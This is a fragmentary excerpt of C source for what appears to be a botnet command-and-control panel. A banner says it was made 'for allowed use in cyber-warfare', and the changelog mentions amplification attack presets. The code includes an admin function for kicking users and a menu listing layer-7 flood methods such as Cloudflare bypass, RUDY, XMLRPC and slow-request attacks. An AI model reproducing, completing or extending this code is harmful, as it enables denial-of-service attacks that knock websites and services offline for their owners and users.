...
║  FOR ALLOWED USE IN 'CYBER-WARFARE' UNDER     ║
║  'succ.fucc-katura.' ALPHA VERSION WILL BE    ║
║  INTRODUCED AFTER CHRISTMAS. JANUARY 2019.    ║
║  ME AND JACK HAVE MADE THIS FOR OUR OWN USE.  ║
...
Added: New presets for new katura custom attack, amplification base factor for [ -0xFF 0xFA 0xF00 ]
...
Added: Kick Function. 
Fixed: All Grammar in display menu's.
Added: 'succfucc' in telnetstruct
_____________________

BETA HAS BEEN FINISHED. DATE ' [ 12/09/18' ] [ 1:15PM]
_____________________
  ...
  if (strcmp(nickstring, accounts[find_line].username) == 0) {
            ...
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))                              // add user function
    {
      ...
      else
      {
        ...
        else if(strstr(buf, "// kick") || strstr(buf, "// KICK"))                               // Zach's Cheeky Kick Function
        {                   
            if(strcmp(admin, accounts[find_line].access) == 0)                                  // This hasn't been tested yet, Jack.
            {
                ...
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    {
                        if(strstr(managements[id].succfucc, user))
                        {
                            sprintf(katura, "\n\x1b[31mGoodbye, Kicked By \x1b[1;36m%s\x1b[0m...\r\n", managements[thefd].succfucc);
                            if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
                            managements[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(katura, "\x1b[1;36mKicked \x1b[1;36m%s\x1b[0m...\r\n", user);
                            if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }                                                                                  // Yeah, I guess it was too far out, but oh well.
        }
        ...
        sprintf(l7_SPOOF1,  "\x1b[38;5;196m[\x1b[38;5;50mHAVEN\x1b[38;5;196m]     // \x1b[38;5;50mHAVEN\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF2,  "\x1b[38;5;196m[\x1b[38;5;50mJOOMLAV2\x1b[38;5;196m]  // \x1b[38;5;50mJOOMLAV2\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF3,  "\x1b[38;5;196m[\x1b[38;5;50mCF_BYPASS\x1b[38;5;196m] // \x1b[38;5;50mCF\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF4,  "\x1b[38;5;196m[\x1b[38;5;50mJOOMLA\x1b[38;5;196m]    // \x1b[38;5;50mJOOMLA\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF5,  "\x1b[38;5;196m[\x1b[38;5;50mRUDY\x1b[38;5;196m]      // \x1b[38;5;50mRUDY\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF6,  "\x1b[38;5;196m[\x1b[38;5;50mXMLRPC\x1b[38;5;196m]    // \x1b[38;5;50mXMLRCP\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF7,  "\x1b[38;5;196m[\x1b[38;5;50mSLOW\x1b[38;5;196m]      // \x1b[38;5;50mSLOW \x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF8,  "\x1b[38;5;196m[\x1b[38;5;50mGHP\x1b[38;5;196m]       // \x1b[38;5;50mGHP \x1b[38;5;50m\r\n");
